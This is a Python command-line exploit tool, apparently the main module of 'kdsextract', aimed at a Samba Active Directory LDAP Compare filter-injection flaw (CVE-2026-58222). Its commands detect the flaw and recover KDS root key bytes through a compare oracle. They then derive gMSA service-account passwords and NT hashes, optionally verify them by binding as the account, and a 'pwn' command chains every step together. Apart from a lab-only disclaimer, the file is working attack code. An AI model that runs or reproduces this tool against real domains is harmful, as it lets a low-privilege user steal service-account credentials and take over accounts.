
from __future__ import annotations

import argparse
import base64
import getpass
import json
import os
import sys
from typing import Optional

from . import __version__
from . import discover, gkdi, inject, ldap, oracle
from .gmsa import GmsaAccount, derive_password_for_account
from .discover import NamingContexts

ATTR_ROOT_KEY_DATA = "msKds-RootKeyData"
ROOT_KEY_DATA_LEN = 64

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="kdsextract",
        description=(
            "CVE-2026-58222 (Samba AD LDAP Compare filter injection) oracle: "
            "recover confidential attributes (KDS root keys) and derive gMSA "
            "passwords. Use only against lab environments you control."
        ),
    )
    p.add_argument("--version", action="version", version=__version__)
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--host", required=True, help="Samba AD DC (LDAP)")
    common.add_argument("--port", type=int, default=389)
    common.add_argument(
        "--user",
        required=True,
        help="low-priv domain principal for simple bind (DN, DOMAIN\\user or user@realm)",
    )
    common.add_argument(
        "--password",
        help="bind password (default: KDSEXTRACT_PASSWORD env var, or interactive prompt)",
    )
    common.add_argument("--timeout", type=float, default=10.0)
    common.add_argument("--json", action="store_true", help="machine-readable output")
    common.add_argument(
        "--progress",
        dest="progress",
        action="store_true",
        default=True,
        help="show byte-by-byte recovery progress on stderr (default)",
    )
    common.add_argument(
        "--no-progress",
        dest="progress",
        action="store_false",
        help="suppress progress output",
    )

    sub = p.add_subparsers(dest="command", required=True)

    sub.add_parser("check", parents=[common], help="detect CVE-2026-58222")

    sub.add_parser("list-keys", parents=[common], help="enumerate KDS root keys")

    rk = sub.add_parser("recover", parents=[common], help="oracle-recover an attribute")
    rk.add_argument("--key", help="KDS root key GUID (default: all)")
    rk.add_argument("--all", action="store_true", help="recover every root key")
    rk.add_argument(
        "--attr",
        default=ATTR_ROOT_KEY_DATA,
        help=f"attribute to recover (default: {ATTR_ROOT_KEY_DATA})",
    )
    rk.add_argument(
        "--length",
        type=int,
        default=None,
        help="value length in bytes (default: known length for the target attribute, "
        "otherwise discovered via the oracle)",
    )
    rk.add_argument(
        "--dn",
        help="arbitrary DN to target with --attr (generic confidential-attribute oracle)",
    )

    sub.add_parser("list-gmsa", parents=[common], help="enumerate gMSA accounts")

    dg = sub.add_parser("dump-gmsa", parents=[common], help="full chain to gMSA password")
    dg.add_argument("--name", help="gMSA sAMAccountName (default: all)")
    dg.add_argument(
        "--verify-bind",
        action="store_true",
        help="after deriving, attempt an LDAP simple bind as the gMSA with its password",
    )

    pw = sub.add_parser("pwn", parents=[common], help="check + recover keys + dump gMSAs")
    pw.add_argument("--verify-bind", action="store_true")
    return p

def resolve_password(args) -> str:
    cached = getattr(args, "_password", None)
    if cached is not None:
        return cached
    if args.password:
        pw = args.password
    else:
        env = os.environ.get("KDSEXTRACT_PASSWORD")
        pw = env if env else getpass.getpass(f"Password for {args.user}: ")
    args._password = pw
    return pw

def connect(args) -> ldap.LdapClient:
    password = resolve_password(args)

    def fresh(use_ssl: bool = False, port: Optional[int] = None) -> ldap.LdapClient:
        client = ldap.LdapClient(
            args.host, port if port is not None else args.port, timeout=args.timeout, use_ssl=use_ssl
        )
        client.connect()
        return client

    client = fresh()
    try:
        client.bind(args.user, password)
        return client
    except ldap.LdapError as exc:

        if exc.code != 8:
            raise
        excs = [exc]
        if not getattr(args, "_tried_ldap_ssl", False) and args.port == 389:
            args._tried_ldap_ssl = True
            try:
                client = fresh(use_ssl=True, port=636)
                client.bind(args.user, password)
                return client
            except (ldap.LdapError, OSError) as exc2:
                excs.append(exc2)
        try:
            client.starttls()
            client.bind(args.user, password)
            return client
        except (ldap.LdapError, OSError) as exc3:
            raise excs[0] from exc3

def realm_from_ncs(ncs: NamingContexts) -> str:
    return ncs.default.removeprefix("DC=").replace(",DC=", ".").lower()

def emit(args, human: str, data) -> None:
    if args.json:
        print(json.dumps(data, indent=2))
    else:
        print(human)

def _probe(client: ldap.LdapClient, dn: str, attr: str, value: bytes):
    try:
        code = client.compare(dn, attr, value)
    except ldap.LdapError as exc:
        return ("error", exc.code)
    return ("tf", code == ldap.RES_COMPARE_TRUE)

def _gmsa_root_key_dn(client, ncs):
    try:
        accounts = discover.list_gmsa_accounts(client, ncs)
    except (ldap.LdapError, discover.DiscoveryError):
        return None
    for a in accounts:
        if a.managed_password_id is not None:
            return discover.kds_root_key_dn(ncs, a.managed_password_id.root_key_id)
    return None

def cmd_check(args) -> int:
    client = connect(args)
    try:
        ncs = NamingContexts.from_client(client)
        findings = {"host": f"{args.host}:{args.port}"}

        p1 = _probe(
            client, ncs.default, inject.inject_ge("dc"), inject.escape_ldap_filter_bytes(b"\x7a")
        )
        findings["operator_injection"] = {"result": p1[0], "value": p1[1]}

        p2 = None
        rk_dn = _gmsa_root_key_dn(client, ncs)
        if rk_dn is not None:
            p2 = _probe(
                client,
                rk_dn,
                inject.inject_ge(ATTR_ROOT_KEY_DATA),
                inject.escape_ldap_filter_bytes(b"\x00"),
            )
            findings["confidential_oracle"] = {"result": p2[0], "value": p2[1], "dn": rk_dn}

            res = client.search(
                rk_dn, ldap.filter_present(ATTR_ROOT_KEY_DATA), ldap.SCOPE_BASE, [ATTR_ROOT_KEY_DATA]
            )
            leaked = bool(res and res[0].get(ATTR_ROOT_KEY_DATA))
            findings["search_redaction_ok"] = not leaked

        vuln = p1[0] == "tf" and (p2 is None or p2[0] == "tf")
        fixed = p1[0] == "error" and p1[1] == 21
        if vuln:
            verdict = "VULNERABLE (CVE-2026-58222): injected compare evaluates and confidential attributes participate"
        elif fixed:
            verdict = "NOT VULNERABLE: attribute operator injection rejected (invalidAttributeSyntax 21) -- fixed Samba"
        else:
            verdict = "UNKNOWN: unexpected probe results"
        findings["verdict"] = verdict
        emit(args, verdict, findings)
        return 0 if (vuln or fixed) else 2
    finally:
        client.close()

def cmd_list_keys(args) -> int:
    client = connect(args)
    try:
        ncs = NamingContexts.from_client(client)
        targets = _root_key_targets(client, ncs, None)
        out = []
        for t in targets:
            entry = {
                "guid": t["guid"],
                "dn": t["dn"],
                "source": t["source"],
                "secret": ATTR_ROOT_KEY_DATA,
            }
            if t["source"] == "listed":

                try:
                    res = client.search(
                        t["dn"],
                        ldap.filter_present("objectClass"),
                        ldap.SCOPE_BASE,
                        ["cn", "msKds-CreateTime", "msKds-UseStartTime",
                         "msKds-Version", "msKds-KDFAlgorithmID", "msKds-KDFParam"],
                    )
                    e = res[0]
                    entry["create_time"] = (e.first("msKds-CreateTime") or b"").decode("utf-8", "replace")
                    entry["kdf_algorithm_id"] = (e.first("msKds-KDFAlgorithmID") or b"").decode("utf-8", "replace")
                    kp = e.first("msKds-KDFParam")
                    if kp:
                        entry["hash"] = gkdi.parse_kdf_param(kp)
                except (ldap.LdapError, gkdi.GkdiError):
                    pass
            out.append(entry)
        human = "\n".join(
            f"{o['guid']}  [{o['source']}]"
            + (f"  hash={o['hash']}" if "hash" in o else "")
            + f"  -> {o['dn']}"
            for o in out
        ) or (
            "no KDS root keys visible (Samba hides msKds-ProvRootKey objects "
            "from ordinary users; keys referenced by gMSA accounts are still "
            "attackable via msDS-ManagedPasswordID)"
        )
        emit(args, human, out)
        return 0 if out else 1
    finally:
        client.close()

def _progress_cb(args):
    if not args.progress or args.json or not sys.stderr.isatty():
        return None

    def cb(n: int, _b: int) -> None:
        sys.stderr.write(f"\r  recovered {n} bytes" + " " * 20)
        sys.stderr.flush()

    return cb

def _finish_progress(args) -> None:
    if not args.json and args.progress:
        sys.stderr.write("\n")

def _root_key_targets(client, ncs, args) -> list:
    keys = []
    try:
        keys = discover.list_kds_root_keys(client, ncs)
    except ldap.LdapError:
        keys = []
    if args and getattr(args, "key", None):
        keys = [k for k in keys if str(k.guid).lower() == args.key.lower()]
        if not keys:

            return [
                {
                    "guid": args.key,
                    "dn": discover.kds_root_key_dn(ncs, args.key),
                    "source": "guid",
                }
            ]
        return [{"guid": str(k.guid), "dn": k.dn, "source": "listed"} for k in keys]
    targets = [{"guid": str(k.guid), "dn": k.dn, "source": "listed"} for k in keys]
    seen = {t["guid"].lower() for t in targets}
    try:
        accounts = discover.list_gmsa_accounts(client, ncs)
    except (ldap.LdapError, discover.DiscoveryError):
        accounts = []
    for a in accounts:
        mp = a.managed_password_id
        if mp is not None and str(mp.root_key_id).lower() not in seen:
            targets.append(
                {
                    "guid": str(mp.root_key_id),
                    "dn": discover.kds_root_key_dn(ncs, mp.root_key_id),
                    "source": "gmsa-reference",
                }
            )
            seen.add(str(mp.root_key_id).lower())
    return targets

def cmd_recover(args) -> int:
    client = connect(args)
    try:
        ncs = NamingContexts.from_client(client)
        if args.dn:
            targets = [
                {
                    "guid": None,
                    "dn": args.dn,
                    "attr": args.attr,
                    "label": args.dn,
                    "length": args.length,
                    "source": "explicit-dn",
                }
            ]
        else:
            targets = [
                {
                    "guid": t["guid"],
                    "dn": t["dn"],
                    "attr": args.attr,
                    "label": t["guid"],
                    "length": args.length,
                    "source": t["source"],
                }
                for t in _root_key_targets(client, ncs, args)
            ]
            for t in targets:
                if t["attr"] == ATTR_ROOT_KEY_DATA and t["length"] is None:
                    t["length"] = ROOT_KEY_DATA_LEN

        results = []
        for t in targets:
            o = oracle.CompareOracle(client, t["dn"], t["attr"])
            try:
                data = o.recover(length=t["length"], on_progress=_progress_cb(args))
            except oracle.OracleError as exc:
                print(f"  [{t['label']}] recovery failed: {exc}", file=sys.stderr)
                results.append(
                    {"target": t["label"], "dn": t["dn"], "error": str(exc)}
                )
                continue
            _finish_progress(args)
            results.append(
                {
                    "target": t["label"],
                    "guid": t["guid"],
                    "dn": t["dn"],
                    "source": t["source"],
                    "attribute": t["attr"],
                    "length": len(data),
                    "queries": o.queries,
                    "hex": data.hex(),
                }
            )
        ok = [r for r in results if "hex" in r]
        human = "\n".join(
            f"{r['target']}: {r['attribute']} ({r['length']} bytes, {r['queries']} queries) = {r['hex']}"
            for r in ok
        ) or "recovery failed on all targets"
        emit(args, human, results)
        return 0 if ok else 1
    finally:
        client.close()

def cmd_list_gmsa(args) -> int:
    client = connect(args)
    try:
        ncs = NamingContexts.from_client(client)
        accounts = discover.list_gmsa_accounts(client, ncs)
        out = [a.password_materials() for a in accounts]
        human = "\n".join(
            f"{o['name']}  sid={o['sid']}  root-key={o.get('root_key_id', '?')}  "
            f"gkid=({o.get('l0_index')},{o.get('l1_index')},{o.get('l2_index')})"
            for o in out
        ) or "no gMSA accounts visible"
        emit(args, human, out)
        return 0
    finally:
        client.close()

def _password_string(password: bytes) -> Optional[str]:
    try:
        s = password.decode("utf-16-le")
        s.encode("utf-8")
        return s
    except UnicodeError:
        return None

def _verify_bind(args, realm: str, account: GmsaAccount, password: bytes) -> dict:
    pw_str = _password_string(password)
    if pw_str is None:
        return {
            "verified": None,
            "note": "password contains unpaired UTF-16 surrogates; cannot be "
            "transmitted as a simple-bind string",
        }
    principal = f"{account.name}@{realm}"
    try:
        c = ldap.LdapClient(args.host, args.port, timeout=args.timeout)
        c.connect()
        c.bind(principal, pw_str)
        c.close()
        return {"verified": True, "principal": principal}
    except ldap.LdapError as exc:
        return {"verified": False, "principal": principal, "error": str(exc)}

def _dump_accounts(args, client, ncs, accounts, recovered: dict) -> list:
    realm = realm_from_ncs(ncs)
    verify = getattr(args, "verify_bind", False)
    out = []
    for account in accounts:
        mp = account.managed_password_id
        entry = account.password_materials()
        entry["password"] = None
        entry["error"] = None
        entry["root_key_dn"] = (
            discover.kds_root_key_dn(ncs, mp.root_key_id) if mp else None
        )
        if mp is None:
            entry["error"] = "no readable msDS-ManagedPasswordID"
            out.append(entry)
            continue
        root_key_data = recovered.get(str(mp.root_key_id))
        if root_key_data is None:
            entry["error"] = f"root key {mp.root_key_id} not recovered yet"
            out.append(entry)
            continue

        try:
            attrs = client.search(
                entry["root_key_dn"],
                ldap.filter_present("objectClass"),
                ldap.SCOPE_BASE,
                ["msKds-KDFAlgorithmID", "msKds-KDFParam", "msKds-Version"],
            )
            raw_attrs = attrs[0].attrs if attrs else {}
        except ldap.LdapError:
            raw_attrs = {}
        entry["root_key_attrs_visible"] = bool(raw_attrs)
        try:
            hashes = discover.root_key_hash_candidates(raw_attrs)
        except discover.DiscoveryError as exc:
            entry["error"] = str(exc)
            out.append(entry)
            continue

        candidates = []
        for hash_name in hashes:
            try:
                password = derive_password_for_account(account, root_key_data, hash_name)
            except ValueError as exc:
                entry["error"] = str(exc)
                continue
            candidates.append(
                {
                    "hash": hash_name,
                    "password": {
                        "hex": password.hex(),
                        "utf16_b64": base64.b64encode(password).decode(),
                        "utf16_string": _password_string(password),
                        "nt_hash": gkdi.nt_hash(password).hex(),
                    },
                }
            )
        if not candidates:
            out.append(entry)
            continue

        if verify:
            for cand in candidates:
                cand["bind_verify"] = _verify_bind(
                    args, realm, account, bytes.fromhex(cand["password"]["hex"])
                )
                if cand["bind_verify"].get("verified"):
                    candidates = [cand]
                    break
            entry["bind_verify"] = candidates[0].get("bind_verify")
        entry["password"] = candidates[0]["password"]
        entry["hash"] = candidates[0]["hash"]
        if len(candidates) > 1:
            entry["password_candidates"] = candidates
        entry["root_key_data_hex"] = root_key_data.hex()
        out.append(entry)
    return out

def _human_gmsa(entries: list) -> str:
    lines = []
    for e in entries:
        lines.append(f"gMSA {e['name']}  (sid {e['sid']})")
        if e.get("error"):
            lines.append(f"  error: {e['error']}")
        if e.get("password"):
            p = e["password"]
            lines.append(f"  root key {e['root_key_id']} hash={e['hash']} gkid={e['l0_index']},{e['l1_index']},{e['l2_index']}")
            lines.append(f"  password (utf-16 hex): {p['hex']}")
            if p["utf16_string"] is not None:
                lines.append(f"  password (string):      {p['utf16_string']}")
            lines.append(f"  NT hash: {p['nt_hash']}")
            v = e.get("bind_verify")
            if v:
                if v["verified"]:
                    lines.append(f"  bind verify: OK as {v['principal']}")
                elif v["verified"] is False:
                    lines.append(f"  bind verify: FAILED ({v.get('error')})")
                else:
                    lines.append(f"  bind verify: skipped ({v.get('note')})")
    return "\n".join(lines) or "no gMSA accounts"

def cmd_dump_gmsa(args) -> int:
    client = connect(args)
    try:
        ncs = NamingContexts.from_client(client)
        accounts = discover.list_gmsa_accounts(client, ncs)
        if args.name:
            accounts = [a for a in accounts if a.name.lower() == args.name.lower()]
            if not accounts:
                print(f"no gMSA named {args.name!r}", file=sys.stderr)
                return 1

        recovered = {}
        for a in accounts:
            mp = a.managed_password_id
            if mp is None or str(mp.root_key_id) in recovered:
                continue
            dn = discover.kds_root_key_dn(ncs, mp.root_key_id)
            o = oracle.CompareOracle(client, dn, ATTR_ROOT_KEY_DATA)
            try:
                data = o.recover(length=ROOT_KEY_DATA_LEN, on_progress=_progress_cb(args))
            except oracle.OracleError as exc:
                print(f"  root key {mp.root_key_id} recovery failed: {exc}", file=sys.stderr)
                continue
            _finish_progress(args)
            recovered[str(mp.root_key_id)] = data
        entries = _dump_accounts(args, client, ncs, accounts, recovered)
        emit(args, _human_gmsa(entries), entries)
        return 0 if all(e.get("password") for e in entries) else 1
    except (oracle.OracleError, ldap.LdapError, discover.DiscoveryError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    finally:
        client.close()

def cmd_pwn(args) -> int:
    client = connect(args)
    try:
        ncs = NamingContexts.from_client(client)

        p1 = _probe(
            client, ncs.default, inject.inject_ge("dc"), inject.escape_ldap_filter_bytes(b"\x7a")
        )
        rk_dn = _gmsa_root_key_dn(client, ncs)
        p2 = None
        if rk_dn is not None:
            p2 = _probe(
                client,
                rk_dn,
                inject.inject_ge(ATTR_ROOT_KEY_DATA),
                inject.escape_ldap_filter_bytes(b"\x00"),
            )
        if p1[0] == "tf" and (p2 is None or p2[0] == "tf"):
            verdict = "VULNERABLE"
        elif p1 == ("error", 21):
            verdict = "NOT VULNERABLE"
        else:
            verdict = "UNKNOWN"

        recovered = {}
        key_results = []
        for t in _root_key_targets(client, ncs, None):
            o = oracle.CompareOracle(client, t["dn"], ATTR_ROOT_KEY_DATA)
            try:
                data = o.recover(length=ROOT_KEY_DATA_LEN, on_progress=_progress_cb(args))
                _finish_progress(args)
                recovered[t["guid"]] = data
                key_results.append(
                    {
                        "guid": t["guid"],
                        "dn": t["dn"],
                        "source": t["source"],
                        "hex": data.hex(),
                        "queries": o.queries,
                    }
                )
            except oracle.OracleError as exc:
                key_results.append(
                    {"guid": t["guid"], "dn": t["dn"], "source": t["source"], "error": str(exc)}
                )

        accounts = discover.list_gmsa_accounts(client, ncs)
        entries = _dump_accounts(args, client, ncs, accounts, recovered)
        emit(
            args,
            f"verdict: {verdict}\n\nroot keys:\n"
            + "\n".join(
                f"  {r['guid']} ({r['source']}): {r.get('hex', r.get('error'))}"
                for r in key_results
            )
            + "\n\n"
            + _human_gmsa(entries),
            {
                "verdict": verdict,
                "root_keys": key_results,
                "gmsa": entries,
            },
        )
        return 0 if verdict == "VULNERABLE" else 1
    except (oracle.OracleError, ldap.LdapError, discover.DiscoveryError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    finally:
        client.close()

def main(argv: Optional[list] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    handlers = {
        "check": cmd_check,
        "list-keys": cmd_list_keys,
        "recover": cmd_recover,
        "list-gmsa": cmd_list_gmsa,
        "dump-gmsa": cmd_dump_gmsa,
        "pwn": cmd_pwn,
    }
    try:
        return handlers[args.command](args)
    except ldap.LdapError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print("interrupted", file=sys.stderr)
        return 130

if __name__ == "__main__":
    raise SystemExit(main())
